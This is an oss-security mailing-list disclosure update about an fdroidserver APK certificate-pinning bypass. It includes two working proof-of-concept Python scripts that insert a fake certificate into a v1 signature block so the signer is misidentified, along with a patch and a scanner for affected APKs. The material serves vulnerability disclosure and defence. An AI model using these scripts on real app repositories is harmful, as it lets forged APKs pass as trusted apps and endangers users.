Received: (qmail 32232 invoked by uid 550); 20 Apr 2024 23:15:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25660 invoked from network); 20 Apr 2024 22:02:20 -0000
Authentication-Results: ext-mx-out013.mykolab.com (amavis);
 dkim=pass (4096-bit key) reason="pass (just generated, assumed good)"
 header.d=kolabnow.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kolabnow.com; h=
	content-disposition:content-type:content-type:mime-version
	:message-id:subject:subject:from:from:date:date:received
	:received:received; s=dkim20160331; t=1713650528; x=1715464929;
	 bh=th56XffNgkx3PMsRfaiBIGRs4oISQvMT7+K6E/1xgSM=; b=qFoFysI/sFgP
	jvW36Co81VbGpotQ6a3z3GmxugrzACcHMRw6UKFL+cnyuZRoca6v5OV93T22nJmJ
	Xp9OZsQsJNvJRAsR/XoakYRD206ZbsImwbvfm72+AWYjoV2i1KXHTvpU3mgWV/B6
	LL/fbn7EAOiQq8L3p/56eE911yByecPtf0M8s6rzicFphJSNESVTSeAeYsFxQr6P
	H1Vjn+YHUeHt5RUYwjJiH/JyVKUtecBsTrGsHfdc8p2oCs6e6h9zq3VTsdjYR4qD
	zeWKG45IxWmMKRqpDK+4eibFUMi37FmfQBJW8IbSpKqOZV613cO5pbGCBMXHl484
	nH9okS89nihKyjBgWJleHEggXghDVk3ML5dAQwPaLQ2yIZGVwhFAUHXk/b8/pbYb
	JSBeGreleBtFKyya6cTXU9GylG6zgqLDOrF7kpW9z5/V0iR+XjMl+CD35bphkjMk
	rRDnPxM4p9O0PHI1UUIo2W0WP5BQhvG/XvMKvY30XvVWIxVpFGskcw0gbi1cuOEU
	CYSTXsIGEnvPUgVL88jdCKVBQwB7NS9VZVP2dIPrJ4uKmjllenKyBNaMBlI9vjW1
	D5anA2J5aV4zCnPLunmMv2eVAGvlQuSDCwQ1HdsfoRPIU1AMJ1gyKnxHe6GbFtVq
	sFjdUbtTHd0cYIXiEYMtgOJTBk2qpb4=
X-Virus-Scanned: amavis at mykolab.com
Date: Sun, 21 Apr 2024 00:02:06 +0200
From: Fay Stegerman <flx@obfusk.net>
To: oss-security@lists.openwall.com
Message-ID: <ZiQ7Xkkm6w5xw2X5@nihonium>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="gPb8XRm3AblyXKQ3"
Content-Disposition: inline
Subject: [oss-security] [Update] PoC for fdroidserver AllowedAPKSigningKeys certificate
 pinning bypass

--gPb8XRm3AblyXKQ3
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi!

An update for [1], still published at [2]: a third PoC, a second patch, and
a script to scan for potentially affected APKs.  I've attached the new files
and included the new sections from the README with the updates below.

Meanwhile, upstream has performed their own analysis and confirmed being
affected by the previously reported vulnerabilities [3].  At present they have
not yet applied any of the suggested patches.  A "fix is in the works" [4] but
repeated warnings that their deviation from the provided second patch would
leave the vulnerability unfixed have been ignored.

- Fay

[1] https://www.openwall.com/lists/oss-security/2024/04/08/8
[2] https://github.com/obfusk/fdroid-fakesigner-poc
[3] https://gitlab.com/fdroid/fdroidserver/-/issues/1128
[4] https://gitlab.com/fdroid/fdroidserver/-/merge_requests/1466

============================================================================

# F-Droid Fake Signer PoC

PoC for fdroidserver AllowedAPKSigningKeys certificate pinning bypass.

Published: 2024-04-08; updated: 2024-04-14, 2024-04-20.

[...]

### [Observations] Update (2024-04-14)

Having been asked about multiple certificates in APK signatures [5], we
realised that, like v2/v3 signatures, v1 signatures can indeed also contain
multiple certificates (e.g. a certificate chain, though neither jarsigner
nor apksigner seem to enforce any relationships between certificates).
However, unlike v2/v3 -- which guarantee that the certificate used for the
signature is always the first in the sequence -- v1 does not define an
ordering: the signature block file is a PKCS#7 DER-encoded ASN.1 data
structure (per RFC 2315) and uses a SET for the list of certificates.

Android/apksigner will find and use the first certificate that matches the
relevant SignerInfo, ignoring any other certificates, but fdroidserver
always returns the first certificate it finds in the signature block file.
Thus we can once again trick it into seeing any certificate we want -- as
long as it only checks the v1 certificate (e.g. when the fdroidserver.patch
has not been applied or the APK only has a v1 signature).

NB: apps with targetSdk >= 30 are required to have a v2/v3 signature.

NB: Android < N will only check the first SignerInfo, later versions pick
the first one that verifies if there are multiple.

### [Observations] Update (2024-04-20)

Despite repeated warnings [5] that using the last certificate instead of the
first one does not in any way fix the vulnerability described in the
2024-04-14 update (PoC #3), the proposed patches for fdroidserver [10] and
androguard [11] do exactly this.  With that patch, version A (which inserts
the fake certificate first) of the PoC now fails, but version B (which
inserts it last) now works.

[...]

### [PoC] Update (2024-04-14)

NB: version A, for fdroidserver using the first v1 certificate.

```bash
$ python3 make-poc-v3a.py   # uses app2.apk (needs targetSdk < 30) as base, adds fake.apk .RSA cert
$ python3 fdroid.py         # verifies and has fake.apk as signer according to F-Droid
True
43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
```

### [PoC] Update (2024-04-20)

NB: version B, for fdroidserver using the last v1 certificate.

```bash
$ python3 make-poc-v3b.py   # uses app2.apk (needs targetSdk < 30) as base, adds fake.apk .RSA cert
$ python3 fdroid.py         # verifies and has fake.apk as signer according to F-Droid
True
43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
```

[...]

### [Patch] Update (2024-04-14)

The fdroidserver-multicert.patch simply rejects any v1 signatures with
multiple certificates.  This may reject some valid APKs, but handling those
properly is nontrivial and there should be few APKs with multiple
certificates and no v2/v3 signatures in the wild (e.g. the IzzyOnDroid
repository found none in its catalog).  We recommend using the official
apksig library (used by apksigner) to both verify APK signatures and return
the first signer's certificate to avoid these kind of implementation
inconsistencies and thus further vulnerabilities like this one.

## Scanner (2024-04-15, 2024-04-20)

The scan.py script can check APKs for *possible* signature issues: it will
flag APKs that are not clearly signed with a single unambiguous certificate,
which *could* result in the kind of accidental misidentification of the
signer -- despite successful verification by apksigner -- that we've
demonstrated here.  Unfortunately, such misidentification can easily happen
as even the official documentation of the various signature schemes does not
completely cover how Android/apksigner handles such cases.

NB: this will flag some valid APKs too, e.g. those with certificate chains,
those having used key rotation, or those with multiple signers; as the
IzzyOnDroid repository found none in its catalog, these cases luckily seem
to be relatively rare.

```bash
$ python3 scan.py poc*.apk
'poc1.apk': Mismatch between v1 and v2/v3 certificates
'poc2.apk': Duplicate block IDs
'poc3a.apk': Multiple certificates in signature block file
'poc3b.apk': Multiple certificates in signature block file
```

## References

[...]

* [5] https://gitlab.com/fdroid/fdroidserver/-/issues/1128
[...]
* [10] https://gitlab.com/fdroid/fdroidserver/-/merge_requests/1466
* [11] https://github.com/androguard/androguard/pull/1038

[...]

--gPb8XRm3AblyXKQ3
Content-Type: text/x-diff; charset=us-ascii
Content-Disposition: attachment; filename="fdroidserver-multicert.patch"

diff --git a/fdroidserver/common.py b/fdroidserver/common.py
index e02d63c1..497b533f 100644
--- a/fdroidserver/common.py
+++ b/fdroidserver/common.py
@@ -3889,6 +3889,9 @@ def get_certificate(signature_block_file):
                              asn1Spec=rfc2315.SignedData())[0]
     try:
         certificates = content.getComponentByName('certificates')
+        if len(certificates) != 1:
+            logging.error("Multiple certificates found.")
+            return None
         cert = certificates[0].getComponentByName('certificate')
     except PyAsn1Error:
         logging.error("Certificates not found.")

--gPb8XRm3AblyXKQ3
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="make-poc-v3a.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool
import pyasn1.codec.cer.encoder as cer_encoder
import zipfile

from apksigtool import (                                        # type: ignore[attr-defined]
    JARSignatureFile, JARSignatureBlockFile, PrivKey, ECDSA, PKCS1v15,
    Halgo, PRIVKEY_TYPE, JAR_HASHERS_STR, DIGEST_ENCRYPTION_ALGORITHM,
    pyasn1_decode, pyasn1_encode, pyasn1_univ, rfc2315,
    create_signature, do_sign)
from typing import Optional, Tuple


# patched copy that doesn't sort setOf so we can reliably insert the fake cert
def encodeValue(self, value, asn1Spec, encodeFun, **options):   # type: ignore
    chunks = self._encodeComponents(
        value, asn1Spec, encodeFun, **options)
    return cer_encoder.null.join(chunks), True, True            # type: ignore


# patched copy that doesn't raise, just warns
def _assert(b: bool, what: Optional[str] = None) -> None:
    if not b:
        print("Assertion failed" + (f": {what}" if what else ""))


# patched copy that adds the fake cert
def _create_signature_block_file(sf: JARSignatureFile, *, cert: bytes, key: PrivKey,
                                 hash_algo: str) -> Tuple[bytes, str]:
    def halgo_f() -> Halgo:
        return ECDSA(halgo()) if alg == "EC" else halgo()       # type: ignore
    alg, = [e for c, e in PRIVKEY_TYPE.items() if isinstance(key, c)]
    oid, _, halgo = JAR_HASHERS_STR[hash_algo]
    dea = DIGEST_ENCRYPTION_ALGORITHM[alg][hash_algo]
    pad = PKCS1v15 if alg == "RSA" else None
    crt = pyasn1_decode(cert, asn1Spec=rfc2315.Certificate())[0]
    sig = create_signature(key, sf.raw_data, halgo_f, pad)
    sdat = rfc2315.SignedData()
    sdat["version"] = 1
    sdat["digestAlgorithms"][0]["algorithm"] = oid
    sdat["contentInfo"] = rfc2315.ContentInfo()
    sdat["contentInfo"]["contentType"] = rfc2315.ContentType(rfc2315.data)
    # --- BEGIN PATCH ---
    print("prepending fake cert...")
    fake_crt = pyasn1_decode(fake_cert, asn1Spec=rfc2315.Certificate())[0]
    sdat["certificates"][0]["certificate"] = fake_crt
    sdat["certificates"][1]["certificate"] = crt
    # --- END PATCH ---
    sinf = sdat["signerInfos"][0]
    sinf["version"] = 1
    sinf["issuerAndSerialNumber"]["issuer"] = crt["tbsCertificate"]["issuer"]
    sinf["issuerAndSerialNumber"]["serialNumber"] = crt["tbsCertificate"]["serialNumber"]
    sinf["digestAlgorithm"]["algorithm"] = oid
    sinf["digestEncryptionAlgorithm"]["algorithm"] = dea
    sinf["encryptedDigest"] = sig
    cinf = rfc2315.ContentInfo()
    cinf["contentType"] = rfc2315.ContentType(rfc2315.signedData)
    cinf["content"] = pyasn1_univ.Any(pyasn1_encode(sdat))
    return pyasn1_encode(cinf), alg


cer_encoder.SetOfEncoder.encodeValue = encodeValue              # type: ignore
apksigtool._assert = _assert
apksigtool._create_signature_block_file = _create_signature_block_file

with zipfile.ZipFile("fake.apk", "r") as zf:
    for info in zf.infolist():
        if info.filename.startswith("META-INF/") and info.filename.endswith(".RSA"):
            print(info.filename)
            data = zf.read(info.filename)
            sbf = JARSignatureBlockFile(raw_data=data, filename=info.filename)
            fake_cert = sbf.certificate.dump()
            break

apksigcopier.copy_apk("app2.apk", "poc-unsigned.apk", exclude=apksigcopier.exclude_meta)

do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
        key="privkey-rsa.der", no_v2=True, no_v3=True)

--gPb8XRm3AblyXKQ3
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="make-poc-v3b.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import apksigcopier
import apksigtool
import pyasn1.codec.cer.encoder as cer_encoder
import zipfile

from apksigtool import (                                        # type: ignore[attr-defined]
    JARSignatureFile, JARSignatureBlockFile, PrivKey, ECDSA, PKCS1v15,
    Halgo, PRIVKEY_TYPE, JAR_HASHERS_STR, DIGEST_ENCRYPTION_ALGORITHM,
    pyasn1_decode, pyasn1_encode, pyasn1_univ, rfc2315,
    create_signature, do_sign)
from typing import Optional, Tuple


# patched copy that doesn't sort setOf so we can reliably insert the fake cert
def encodeValue(self, value, asn1Spec, encodeFun, **options):   # type: ignore
    chunks = self._encodeComponents(
        value, asn1Spec, encodeFun, **options)
    return cer_encoder.null.join(chunks), True, True            # type: ignore


# patched copy that doesn't raise, just warns
def _assert(b: bool, what: Optional[str] = None) -> None:
    if not b:
        print("Assertion failed" + (f": {what}" if what else ""))


# patched copy that adds the fake cert
def _create_signature_block_file(sf: JARSignatureFile, *, cert: bytes, key: PrivKey,
                                 hash_algo: str) -> Tuple[bytes, str]:
    def halgo_f() -> Halgo:
        return ECDSA(halgo()) if alg == "EC" else halgo()       # type: ignore
    alg, = [e for c, e in PRIVKEY_TYPE.items() if isinstance(key, c)]
    oid, _, halgo = JAR_HASHERS_STR[hash_algo]
    dea = DIGEST_ENCRYPTION_ALGORITHM[alg][hash_algo]
    pad = PKCS1v15 if alg == "RSA" else None
    crt = pyasn1_decode(cert, asn1Spec=rfc2315.Certificate())[0]
    sig = create_signature(key, sf.raw_data, halgo_f, pad)
    sdat = rfc2315.SignedData()
    sdat["version"] = 1
    sdat["digestAlgorithms"][0]["algorithm"] = oid
    sdat["contentInfo"] = rfc2315.ContentInfo()
    sdat["contentInfo"]["contentType"] = rfc2315.ContentType(rfc2315.data)
    # --- BEGIN PATCH ---
    print("appending fake cert...")
    fake_crt = pyasn1_decode(fake_cert, asn1Spec=rfc2315.Certificate())[0]
    sdat["certificates"][0]["certificate"] = crt
    sdat["certificates"][1]["certificate"] = fake_crt
    # --- END PATCH ---
    sinf = sdat["signerInfos"][0]
    sinf["version"] = 1
    sinf["issuerAndSerialNumber"]["issuer"] = crt["tbsCertificate"]["issuer"]
    sinf["issuerAndSerialNumber"]["serialNumber"] = crt["tbsCertificate"]["serialNumber"]
    sinf["digestAlgorithm"]["algorithm"] = oid
    sinf["digestEncryptionAlgorithm"]["algorithm"] = dea
    sinf["encryptedDigest"] = sig
    cinf = rfc2315.ContentInfo()
    cinf["contentType"] = rfc2315.ContentType(rfc2315.signedData)
    cinf["content"] = pyasn1_univ.Any(pyasn1_encode(sdat))
    return pyasn1_encode(cinf), alg


cer_encoder.SetOfEncoder.encodeValue = encodeValue              # type: ignore
apksigtool._assert = _assert
apksigtool._create_signature_block_file = _create_signature_block_file

with zipfile.ZipFile("fake.apk", "r") as zf:
    for info in zf.infolist():
        if info.filename.startswith("META-INF/") and info.filename.endswith(".RSA"):
            print(info.filename)
            data = zf.read(info.filename)
            sbf = JARSignatureBlockFile(raw_data=data, filename=info.filename)
            fake_cert = sbf.certificate.dump()
            break

apksigcopier.copy_apk("app2.apk", "poc-unsigned.apk", exclude=apksigcopier.exclude_meta)

do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
        key="privkey-rsa.der", no_v2=True, no_v3=True)

--gPb8XRm3AblyXKQ3
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="scan.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: AGPL-3.0-or-later

import argparse
import hashlib
import logging
import sys
import zipfile

from pyasn1.codec.der.decoder import decode as pyasn1_decode
from pyasn1.codec.der.encoder import encode as pyasn1_encode
from pyasn1.error import PyAsn1Error
from pyasn1_modules import rfc2315                      # type: ignore[import-untyped]

from typing import Any, List, Optional, Tuple

from androguard.core.bytecodes import apk as ag_apk     # type: ignore[import-untyped]


class Err(Exception):
    pass


class Warn(Exception):
    pass


class HDict(dict):                                      # type: ignore[type-arg]
    def __init__(self) -> None:
        self.history: List[Tuple[Any, Any]] = []

    def __setitem__(self, k: Any, v: Any) -> None:
        self.history.append((k, v))
        super().__setitem__(k, v)


def check_apk_certs(apk: str) -> Optional[bytes]:
    instance = ag_apk.APK(apk)
    assert getattr(instance, "_v2_blocks", None) == {}  # pylint: disable=C1803
    instance._v2_blocks = hdict = HDict()
    instance.parse_v2_signing_block()
    block_ids = [k for k, v in hdict.history]
    if len(block_ids) != len(set(block_ids)):
        raise Err("Duplicate block IDs")
    v3_certs = instance.get_certificates_der_v3()
    v2_certs = instance.get_certificates_der_v2()
    if len(v3_certs) > 1:
        raise Warn("Multiple v3 certificates")
    if len(v2_certs) > 1:
        raise Warn("Multiple v2 certificates")
    if not (v2_certs or v3_certs):
        return None
    if v2_certs and v3_certs and v2_certs != v3_certs:
        raise Warn("Mismatch between v2 and v3 certificates")
    result = v3_certs[0] if v3_certs else v2_certs[0]
    assert isinstance(result, bytes)
    return result


# FIXME: check for .RSA w/o .SF?
def check_jar_certs(apk: str) -> Optional[bytes]:
    signature_block_files = []
    with zipfile.ZipFile(apk, "r") as zf:
        for filename in zf.namelist():
            if filename.startswith("META-INF/"):
                if any(filename.endswith(ext) for ext in (".DSA", ".EC", ".RSA")):
                    signature_block_files.append(zf.read(filename))
    if len(signature_block_files) > 1:
        raise Warn("Multiple signature block files")
    if not signature_block_files:
        return None
    certificates = []
    try:
        cinf = pyasn1_decode(signature_block_files[0], asn1Spec=rfc2315.ContentInfo())[0]
        if cinf["contentType"] != rfc2315.signedData:
            raise Err("Signature block file contentType is not signedData")
        sdat = pyasn1_decode(cinf["content"], asn1Spec=rfc2315.SignedData())[0]
        for cert in sdat["certificates"]:
            certificates.append(pyasn1_encode(cert))
    except PyAsn1Error as e:
        raise Err("Unable to parse signature block file data") from e
    if len(certificates) > 1:
        raise Warn("Multiple certificates in signature block file")
    if not certificates:
        raise Err("No certificates in signature block file")
    assert isinstance(certificates[0], bytes)
    return certificates[0]


# NB: this will flag some valid APKs too, e.g. those with certificate chains,
# rotation, or multiple signers
def check_apks(*apks: str, verbose: bool) -> bool:
    ok = True
    for apk in apks:
        if verbose:
            print(f"Checking {apk!r} ...")
        try:
            apk_cert = check_apk_certs(apk)
            jar_cert = check_jar_certs(apk)
            if apk_cert is None and jar_cert is None:
                raise Err("No certificates in APK")
            if apk_cert is not None and jar_cert is not None and apk_cert != jar_cert:
                raise Warn("Mismatch between v1 and v2/v3 certificates")
        except (Err, Warn) as e:
            ok = False
            if verbose:
                t = "Error" if isinstance(e, Err) else "Warning"
                print(f"  {t}: {e}", file=sys.stderr)
            else:
                print(f"{apk!r}: {e}", file=sys.stderr)
        else:
            if verbose:
                cert = apk_cert or jar_cert
                assert isinstance(cert, bytes)
                fingerprint = hashlib.sha256(cert).hexdigest()
                print(f"  OK {fingerprint}")
    return ok


if __name__ == "__main__":
    # disable androguard warnings
    logging.getLogger().setLevel(logging.ERROR)
    parser = argparse.ArgumentParser(description="Check APKs for possible signature issues.")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("apks", metavar="APK", nargs="*", help="APK file(s) to check")
    args = parser.parse_args()
    if not check_apks(*args.apks, verbose=args.verbose):
        sys.exit(1)

# vim: set tw=80 sw=4 sts=4 et fdm=marker :

--gPb8XRm3AblyXKQ3--
